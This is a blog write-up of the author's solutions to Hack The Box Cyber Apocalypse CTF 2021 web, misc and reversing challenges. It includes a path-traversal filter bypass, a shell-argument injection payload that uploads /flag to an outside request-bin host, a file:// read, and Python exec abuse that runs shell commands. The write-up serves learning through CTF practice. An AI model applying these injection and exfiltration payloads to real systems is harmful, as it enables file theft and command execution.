---
title: "Hack The Box - Cyber Apocalypse CTF 21"
date: 2021-04-25T22:00:35+05:30
draft: false
toc: false
images:
tags:
  - ctf
  - htb
  - web
  - rev
---

I participated in Hack The Box's Cyber Apocalypse CTF 2021 this week. I was only able to solve 11 challenges (excluding the welcome challenge) but overall it was a fun event. The challenges were nice and did not need any form of guessing.

## WEB - Inspector Gadget

This was the entry level web challenge and the flag was split in 3 parts which were then placed in the HTML, CSS and JavaScript files as comments.

## WEB - MiniSTRyplace

This challenge provided the source code of the challenge. The website was running a PHP script which checked the `lang` URL parameter and included that language's PHP page. It was pretty clear that this was a [Path Traversal Exploit](https://owasp.org/www-community/attacks/Path_Traversal) but the solution wasn't straightforward.

Here is the code snippet that performed the file inclusion. The code has a very weak "filter" to prevent path traversal attack.

```php
<?php
$lang = ['en.php', 'qw.php'];
    include('pages/' . (isset($_GET['lang']) ? str_replace('../', '', $_GET['lang']) : $lang[array_rand($lang)]));
?>
</body>
```

Honestly, I had no idea how to bypass this `str_replace` filter and this is perhaps the simplest filter to stop path traversal. The `str_replace` function call removes `../` from the provided string. So, I started reading about path traversal attacks and the solution I found was so obvious that I wanted to punch myself.

What `str_replace` is doing is that it removes all instances of `../` in the given string but it does not do this recursively. A string like `../../../../foo/bar` will get reduced to `foo/bar` but `...././foo/bar` will get reduced to `../foo/bar`. Therefore, all you need to do is add `../` in the payload which when removed will give the required payload.

Final payload: `?lang=..././..././flag`

## WEB - Caas

This challenge also provided the source code of the website but the codebase was larger than the previous problems. Long story short, the website took a URL as input and a `CURL` request was made to the URL from the PHP backend and the output was then returned to the client. This is the PHP code snippet that made the `CURL` request -

```php
<?php
class CommandModel
{
    public function __construct($url)
    {
        $this->command = "curl -sL " . escapeshellcmd($url);
    }

    public function exec()
    {
        exec($this->command, $output);
        return $output;
    }
}
```

So, like the noobie that I am, I tried different payloads without understanding the code properly. I tried appending simple bash commands like - `ls`, `cat flag.txt` to the `url` parameter hoping that this injected command would get executed after `curl`. Turns out, this is what `escapeshellcmd` is supposed to filter. From the PHP docs -

  > escapeshellcmd() escapes any characters in a string that might be used to trick a shell command into executing arbitrary commands.

So, I started reading about `escapeshellcmd` exploits and found a Github [repo](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md) that had payloads for `escapeshellcmd` exploits. Basically, the idea is to make a `POST` request using the `CURL` command and send the `flag.txt` file along with the request. I found [this](https://stackoverflow.com/questions/12667797/using-curl-to-upload-post-data-with-files) answer that showed how to do this.

Now, all I needed was an endpoint to make a `POST` request to and view the received request. These are called Request Bins and are used a lot in XSS challenges. For this challenge, I used Beeceptor.

Final payload: `-F file=@/flag https://ctfctf.free.beeceptor.com`

Here is the request I received on Beeceptor's console. Also, the flag visible in the request body is the test flag since I generated this request from a local instance for the writeup.

![console](/static/beeceptor.png)

I read other people's writeups once the event was over and the actual solution made me feel very dumb. You can simply use the `file` URI [scheme](https://en.wikipedia.org/wiki/File_URI_scheme) to directly read the `flag` file. A `GET` request to `file:///flag` would just return the file directly.

## MISC - Input as a Service

This challenge only provided an IP address to connect to and nothing else. After connecting to the IP using netcat, you get an interactive shell. After playing around with it for a few minutes, you would realise that it is a python shell. Basically, the input was executed as python using the `exec` command. Here is a code snippet that might have been running at the server -

```python
while 1:
  text = input('>> ')
  exec(text)
```

I tried running `ls` command using `os.system("ls")` but the module `os` was not imported in the running environment. So, I started my research and found an [article](http://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python).

The solution is that python has a function `__import__` that can be used to dynamically include modules and run commands. Here are the commands I tried and the output I received.

```python
Do you sound like an alien?
>>> 
__import__("os").system("ls")
flag.txt
input_as_a_service.py
__import__("os").system("cat flag.txt")
CHTB{4li3n5_us3_pyth0n2.X?!}
```

## MISC - Alien Camp

In this challenge, there was a mapping provided to us which was an emoji and an integer associated with it. In order to get the flag, 500 queries had to be answered that were mathematical expressions using the emojis. Obviously this can not be done manually and needed automation.

The solution to this was pretty straightforward. I created a simple dictionary with the emojis as key and the integer as the value. And for every query, I replaced the emoji with its integer value and evaluated the string using `eval`. Here is the final script that worked.

```python
from pwn import *

r = remote("138.68.185.219", 31618)
r.recv().decode()

r.sendline(b"1")

r.recvuntil("help:\n\n").decode()
keys = r.recvuntil("\n\n").decode()

keys = keys.strip().split(" ")
nums = dict()

for i in range(0, len(keys), 3):
    nums[keys[i]] = keys[i + 2]

print(nums)

r.recv().decode()
r.sendline(b"2")

for i in range(500):
    r.recvuntil(":\n").decode()
    query = r.recvuntil(" =").decode()[:-2]

    for each in nums.keys():
        query = query.replace(each, nums[each])
    ans = str(eval(query))

    r.recv().decode()
    r.sendline(str(ans))

print(r.recv().decode())
```

## REV - Passphrase

This was a reverse engineering challenge so naturally there was a binary provided. The binary was a `64-bit ELF` that wasn't stripped. On running the binary, it asked for a secret passphrase and it was safe to assume that the flag was the secret passphrase.

On executing the binary instruction by instruction, I found that there was a call to `strcmp` function that compared the user input to a fixed value. When the execution reached the `strcmp` call, the two values were present in the appropriate registers. Here is the gdb output on reaching the `strcmp` call.

```bash
 ► 0x555555554ac0 <main+250>    call   strcmp@plt <0x555555554820>
        s1: 0x7fffffffdda0 ◂— '3xtr4t3rR3stR14L5_VS_hum4n5'
        s2: 0x7fffffffddc0 ◂— 0x41414141 /* 'AAAA' */
 
```

Thanks [pwndbg](https://github.com/pwndbg/pwndbg) for making our lives easier.

## REV - Authenticator

This was another easy straightforward challenge. The binary asked for an Alien ID which was `11337`. This was present in the source code of the binary generated by Ghidra. The second input asked for a pin which was checked by the `checkpin` function. Here is the source code of the function.

```cpp
undefined8 checkpin(char *param_1) {
  size_t sVar1;
  int local_24;
  
  local_24 = 0;
  while( true ) {
    sVar1 = strlen(param_1);
    if (sVar1 - 1 <= (ulong)(long)local_24) {
      return 0;
    }
    if ((byte)("}a:Vh|}a:g}8j=}89gV<p<}:dV8<Vg9}V<9V<:j|{:"[local_24] ^ 9U) != param_1[local_24])
    break;
    local_24 = local_24 + 1;
  }
  return 1;
}
```

This function computes the XOR of this string with the integer `9` and compares with the provided input. Therefore, the flag is this long string when XOR'd with `9` byte by byte. Pretty straightforward like I said before.

## Conclusion

Overall, I enjoyed working on these challenges and the writeups I have read on the challenges I couldn't solve have been amazing. I was so close in some of them but just couldn't connect the final dot. Other than these, I also solved 4 crypto challenges but I am not at all equipped with the skills to explain how I solved them. I like that the difficulty level of problems increased gradually so everyone could solve some challenges. I finished at 652 in 4740 teams which isn't that good but I learned a great deal from this CTF. This was clearly the best CTF I have participated in and the team at Hack The Box did a great job. Thanks for reading. Cheers!
